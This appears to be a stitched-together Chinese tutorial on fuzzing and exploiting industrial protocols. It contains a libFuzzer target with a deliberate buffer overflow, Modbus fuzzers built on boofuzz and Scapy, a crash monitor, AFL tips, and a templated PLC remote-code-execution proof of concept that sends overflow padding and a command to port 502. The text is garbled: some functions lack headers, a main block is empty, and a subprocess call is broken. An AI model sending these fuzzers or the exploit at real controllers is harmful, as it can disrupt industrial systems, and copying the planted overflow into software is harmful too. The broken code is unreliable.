#include <stddef.h>
#include <string.h>

// 目标函数：解析自定义协议
int parse_protocol(const uint8_t *data, size_t size) {
    if (size < 4) return -1;
    
    // 模拟协议解析逻辑
    uint8_t magic = data[0];
    uint8_t cmd = data[1];
    uint16_t length = (data[2] << 8) | data[3];
    
    if (magic != 0xAA) return -1;
    if (length > 1024) return -1;
    if (size < length + 4) return -1;
    
    // 潜在的漏洞点
    char buffer[64];
    if (cmd == 0x01) {
        memcpy(buffer, data + 4, length);  // 缓冲区溢出风险
    }
    
    return 0;
}

// libFuzzer入口函数
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    parse_protocol(data, size);
    return 0;
}

from boofuzz import *

# Modbus TCP Fuzzing示例
def modbus_fuzz(target_ip, target_port):
    session = Session(
        target=Target(
            connection=TCPSocketConnection(target_ip, target_port)
        ),
        sleep_time=0.1,
    )
    
    # 定义Modbus TCP消息结构
    s_initialize("ModbusTCP")
    
    # MBAP Header
    if s_block_start("MBAP"):
        s_word(0x0001, name="TransactionId")  # 事务ID
        s_word(0x0000, name="ProtocolId")     # 协议ID
        s_word(0x0006, name="Length")         # 长度
        s_byte(0x01, name="UnitId")           # 从站地址
    s_block_end()
    
    # PDU - 读保持寄存器
    if s_block_start("PDU"):
        s_byte(0x03, name="FunctionCode", fuzz_values=[1, 2, 3, 4, 5, 6, 7, 8, 15, 16])
        s_word(0x0000, name="StartAddress")
        s_word(0x000A, name="Quantity")
    s_block_end()
    
    # 连接并Fuzzing
    session.connect(s_get("ModbusTCP"))
    session.fuzz()

if __name__ == "__main__":

#### 2.1 Modbus协议Fuzzing实战

**使用Scapy + 自定义Fuzzer：**
```python
from scapy.all import *
from scapy.contrib.modbus import *
import random
import struct

class ModbusFuzzer:
    """Modbus协议模糊测试器"""
    
    def __init__(self, target_ip, target_port=502):
        self.target_ip = target_ip
        self.target_port = target_port
        self.crashes = []
        self.total_tests = 0
    
    def generate_fuzzed_data(self, length=100):
        """生成模糊测试数据"""
        strategies = [
            lambda: b'\x00' * length,           # 全零
            lambda: b'\xff' * length,           # 全1
            lambda: b'\x41' * length,           # 'A'填充
            lambda: bytes([random.randint(0,255) for _ in range(length)]),  # 随机
            lambda: struct.pack('>H', 0) * (length//2),  # 空字
            lambda: bytes(range(256)) * (length//256 + 1),  # 字节循环
        ]
        return random.choice(strategies)()[:length]
    
    def fuzz_function_code(self):
        """Fuzz功能码字段"""
        print("[*] Fuzzing Modbus功能码...")
        for fc in range(0, 256):
            try:
                pkt = IP(dst=self.target_ip)/TCP(dport=self.target_port, flags='PA')
                pkt /= ModbusADU(transId=random.randint(1, 65535), unitId=1)
                pkt /= Raw(load=bytes([fc]) + b'\x00\x00\x00\x0a')
                
                resp = sr1(pkt, timeout=1, verbose=0)
                self.total_tests += 1
                
                if resp is None:
                    print(f"[!] 无响应 - 功能码: {fc}")
                    self.crashes.append(('function_code', fc, 'no_response'))
                    
            except Exception as e:
                print(f"[!] 异常: {e} - 功能码: {fc}")
                self.crashes.append(('function_code', fc, str(e)))
    
    def fuzz_register_address(self):
        """Fuzz寄存器地址"""
        print("[*] Fuzzing寄存器地址...")
        for addr in [0, 1, 65535, 65536, -1, 32768, 49152]:
            try:
                pkt = IP(dst=self.target_ip)/TCP(dport=self.target_port, flags='PA')
                pkt /= ModbusADU(transId=1, unitId=1)
                pkt /= ModbusPDU03ReadHoldingRegisters(
                    startAddr=addr & 0xFFFF,
                    quantity=10
                )
                
                resp = sr1(pkt, timeout=1, verbose=0)
                self.total_tests += 1
                
                if resp is None:
                    print(f"[!] 无响应 - 地址: {addr}")
                    self.crashes.append(('register_addr', addr, 'no_response'))
                    
            except Exception as e:
                print(f"[!] 异常: {e}")
                self.crashes.append(('register_addr', addr, str(e)))
    
    def run_all_tests(self):
        """运行所有Fuzzing测试"""
        print(f"[*] 开始Modbus Fuzzing测试 - 目标: {self.target_ip}")
        self.fuzz_function_code()
        self.fuzz_register_address()
        print(f"[*] 测试完成 - 总计: {self.total_tests}, 崩溃: {len(self.crashes)}")
        return self.crashes

# 使用示例
if __name__ == "__main__":
    fuzzer = ModbusFuzzer("192.168.1.100")
    crashes = fuzzer.run_all_tests()
    for crash in crashes:
        print(f"  {crash}")
```

#### 2.2 Fuzzing 监控与崩溃检测

**进程监控与崩溃检测：**
```python
import subprocess
import signal
import time
import os

class FuzzMonitor:
    """Fuzzing进程监控器"""
    
    def __init__(self, target_cmd, input_file):
        self.target_cmd = target_cmd
        self.input_file = input_file
        self.crash_count = 0
        self.crash_dir = "crashes"
        os.makedirs(self.crash_dir, exist_ok=True)
    
    def run_once(self, input_data):
        """运行一次测试"""
        # 写入测试输入
        with open(self.input_file, 'wb') as f:
            f.write(input_data)
        
        try:
            # 启动目标进程
            proc = subprocess.Popen(
                self.target_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5  # 超时时间
            )
            stdout, stderr = proc.communicate()
            
            # 检查返回码（崩溃通常返回非零值或被信号终止）
            if proc.returncode < 0:
                # 负返回码表示被信号终止（如SIGSEGV）
                signal_num = -proc.returncode
                signal_name = signal.Signals(signal_num).name
                self.save_crash(input_data, signal_name)
                return True, signal_name
            
            # 检查ASan输出
            if b'ERROR: AddressSanitizer' in stderr:
                self.save_crash(input_data, 'ASan')
                return True, 'AddressSanitizer'
                
            return False, None
            
        except subprocess.TimeoutExpired:
            # 超时（可能是DoS或死循环）
            return False, 'timeout'
        except Exception as e:
            return False, str(e)
    
    def save_crash(self, input_data, crash_type):
        """保存崩溃样本"""
        self.crash_count += 1
        filename = os.path.join(
            self.crash_dir, 
            f"crash_{self.crash_count:04d}_{crash_type}.bin"
        )
        with open(filename, 'wb') as f:
            f.write(input_data)
        print(f"[!] 发现崩溃: {filename} ({crash_type})")
```

#### 2.3 Fuzzing 优化技巧

```markdown
Fuzzing 优化策略

1. 样本最小化（Test Case Minimization）
   - 使用 afl-tmin 最小化崩溃样本
   - 命令：afl-tmin -i crash_input -o minimized -- ./target @@
   - 目的：减少崩溃样本大小，便于分析

2. 语料库蒸馏（Corpus Distillation）
   - 使用 afl-cmin 精简输入语料库
   - 命令：afl-cmin -i inputs/ -o minimized_inputs/ -- ./target @@
   - 目的：去除冗余样本，提高Fuzzing效率

3. 字典增强
   - 收集协议中的关键字段值
   - 创建.dict字典文件
   - AFL：afl-fuzz -x dict.txt ...
   - libFuzzer：-dict=dict.txt

4. 覆盖率反馈
   - 使用插桩编译获取覆盖率反馈
   - 定期检查覆盖率增长
   - 针对未覆盖代码设计定向Fuzzing

5. 并行Fuzzing
   - AFL++：-M / -S 参数主从模式
   - libFuzzer：-jobs=N -workers=N
   - 提高Fuzzing速度和覆盖率

6. 持久模式（Persistent Mode）
   - AFL++：使用 __AFL_LOOP() 宏
   - libFuzzer：默认就是持久模式
   - 避免进程启动开销，大幅提升速度
```

漏洞名称：XXX PLC 远程代码执行漏洞
CVE编号：CVE-202X-XXXXX
漏洞类型：远程代码执行

影响版本：固件版本 < Vx.x

日期：202X-XX-XX

声明：本代码仅供安全研究和授权测试使用，请勿用于非法用途。

import sys
import socket
import struct
import argparse

def create_exploit_payload(command):
    """构造漏洞利用Payload"""
    # 漏洞原理：缓冲区溢出导致的RCE
    # 详细说明漏洞触发条件和利用方式
    
    # 构造协议头
    header = struct.pack('>HHH', 0x0001, 0x0000, 0x00FF)
    
    # 溢出数据
    padding = b'A' * 256  # 填充到溢出点
    
    # 控制寄存器的值（ROP链地址等）
    eip = struct.pack('<I', 0xDEADBEEF)  # 示例地址
    
    # Shellcode或命令
    shellcode = command.encode() + b'\x00'
    
    payload = header + padding + eip + shellcode
    return payload

def exploit(target_ip, target_port, command):
    """执行漏洞利用"""
    print(f"[*] 目标: {target_ip}:{target_port}")
    print(f"[*] 执行命令: {command}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, target_port))
        
        # 发送漏洞利用Payload
        payload = create_exploit_payload(command)
        sock.send(payload)
        
        # 接收响应（如果有）
        try:
            response = sock.recv(1024)
            print(f"[+] 收到响应: {response.hex()}")
        except socket.timeout:
            print("[*] 无响应（漏洞可能已触发）")
        
        sock.close()
        print("[+] 漏洞利用完成")
        return True
        
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False

    # 使用不会造成危害的方式检测
    # 例如：发送畸形数据检测是否异常响应
    print(f"[*] 验证目标: {target_ip}:{target_port}")
    # ... 验证逻辑 ...
    return True

    parser = argparse.ArgumentParser(description='XXX PLC 漏洞利用PoC')
    parser.add_argument('-t', '--target', required=True, help='目标IP地址')
    parser.add_argument('-p', '--port', type=int, default=502, help='目标端口')
    parser.add_argument('-c', '--command', default='id', help='要执行的命令')
    parser.add_argument('--verify', action='store_true', help='仅验证漏洞存在')
